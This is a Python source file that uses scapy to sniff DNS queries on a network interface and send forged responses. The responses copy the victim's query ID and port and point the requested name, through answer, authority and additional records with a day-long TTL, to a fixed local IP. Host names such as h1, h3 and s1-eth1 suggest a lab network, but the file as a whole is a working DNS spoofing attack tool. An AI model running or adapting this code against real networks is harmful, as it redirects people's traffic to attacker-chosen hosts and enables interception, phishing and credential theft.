#!/usr/bin/env python
# code inspired by Nik Alleyne (https://www.securitynik.com/2014/05/building-your-own-tools-with-scapy.html)
# dnsSpoof.py

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *


# def osCheck():
#  if ( uname()[0].strip() == 'Linux' ) or ( uname()[0].strip() == 'linux ') :
#   print(' Current system is Linux ... Good to go!!')
#  else:
#   print(' Not a Linux system ... Exiting ')
#   print(' This script is designed to work on Linux ... if you wish you can modify it for your OS ')
#   exit(0)


# def usage():
#  print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
#  print(" e.g. ./dnsSpoof eth0 10.0.0.1")


def main():

    while 1:
        # Sniff the network for destination port 53 traffic
        print(' Sniffing for DNS Packet ')
        s1iface = "s1-eth1"
        DNSPacket = sniff(iface=s1iface, filter="dst port 53", count=1)
        # if the sniffed packet is a DNS Query, let's do some work
        if (DNSPacket[0].haslayer(DNS)) and (DNSPacket[0].getlayer(DNS).qr == 0):
            print('\n Got Query on %s ' % ctime())

            # h1's MAC address
            clientHwAddr = DNSPacket[0].getlayer(Ether).src

            # h3's MAC address
            spoofedHwAddr = DNSPacket[0].getlayer(Ether).dst

            # Craft Esthenet packet
            spoofedEtherPkt = Ether(src=spoofedHwAddr, dst=clientHwAddr)

            # Extract the src IP
            clientSrcIP = DNSPacket[0].getlayer(IP).src

            spoofedDNSServerIP = "10.2.1.1"

            # Now that we have our source IP and we know the client's destination IP. Let's build our IP Header
            spoofedIPPkt = IP(src=spoofedDNSServerIP, dst=clientSrcIP)
            # Extract UDP Src port
            clientSrcPort = DNSPacket[0].getlayer(UDP).sport
          
            # Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
            clientDNSQueryID = DNSPacket[0].getlayer(DNS).id

            # Extract the Query Count
            clientDNSQueryDataCount = DNSPacket[0].getlayer(DNS).qdcount

            # Extract client's current DNS server
            clientDNSServer = DNSPacket[0].getlayer(IP).dst

            # Extract the DNS Query. Obviously if we will respond to a domain query, we must reply to what was asked for.
            clientDNSQuery = DNSPacket[0].getlayer(DNS).qd.qname

            print(' Received Src IP:%s, \n Received Src Port: %d \n Received Query ID:%d \n Query Data Count:%d \n Current DNS Server:%s \n DNS Query:%s ' % (
                clientSrcIP, clientSrcPort, clientDNSQueryID, clientDNSQueryDataCount, clientDNSServer, clientDNSQuery))

           
           

            # Now let's move up the IP stack and build our UDP or TCP header
            # We know our source port will be 53. However, our destination port has to match our client's.
            # In addition, we don't know if this is UDP or TCP, so let's ensure we capture both
            fakeLocalIP = "10.3.2.1"
            
            spoofedUDPPacket = UDP(sport=53, dport=clientSrcPort)
            

            # Ok Time for the main course. Let's build out the DNS packet response. This is where the real work is done.
            # qr = 1 as it is a response
            # opcode: the type of query (0 for standard). According to RFC, "This value is set by the originator of a query
            #  and copied into the response."
            # RFC: "Authoritative Answer - this bit is valid in responses"
            # spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=DNSPacket[0].getlayer(DNS).opcode,aa=1,\
            #  #
            #                        rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=0,arcount=0,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass))
            spoofedDNSPakcet = DNS(id=clientDNSQueryID, qr=1, opcode=DNSPacket[0].getlayer(DNS).opcode,
                                    aa=1, rd=0, ra=0, z=0, rcode=0, qdcount=clientDNSQueryDataCount, ancount=1, nscount=1, arcount=1,
                                    qd=DNSQR(qname=clientDNSQuery, qtype=DNSPacket[0].getlayer(
                                        DNS).qd.qtype, qclass=DNSPacket[0].getlayer(DNS).qd.qclass),
                                    an=DNSRR(rrname=clientDNSQuery, rdata=fakeLocalIP, ttl=86400), ns=DNSRR(rrname=clientDNSQuery, type=2, ttl=86400, rdata=fakeLocalIP),
                                    ar=DNSRR(rrname=clientDNSQuery, rdata=fakeLocalIP))

            # Now that we have built our packet, let's go ahead and send it on its merry way.
            print(' \n Sending spoofed response packet ')
            sendp(spoofedEtherPkt/spoofedIPPkt/spoofedUDPPacket /
                  spoofedDNSPakcet, iface=s1iface, count=1)
            print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %
                  (spoofedDNSServerIP, 53, clientSrcPort))

        else:
            pass


if __name__ == '__main__':
    main()
